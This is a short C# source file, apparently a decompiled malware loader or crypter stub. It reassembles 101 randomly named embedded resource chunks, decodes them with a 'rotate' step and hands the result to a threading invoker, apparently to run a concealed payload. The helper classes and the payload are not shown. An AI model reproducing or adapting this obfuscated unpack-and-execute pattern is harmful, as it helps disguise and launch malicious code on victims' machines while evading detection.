using System;
using System.Resources;

namespace DarthRevan;

public class Program
{
	public static void Main()
	{
		int num = Convert.ToInt32("101");
		for (int i = 0; i < num; i++)
		{
			Includer.Append(ReadData(i));
		}
		Includer.Finish();
		Rotate.RotateIt(ref DataContainer.Data);
		Threading.Invoker();
	}

	private static byte[] ReadData(int index)
	{
		return (byte[])new ResourceManager("ZTYRcLT", typeof(Program).Assembly).GetObject("HsJ4Mon" + index);
	}
}
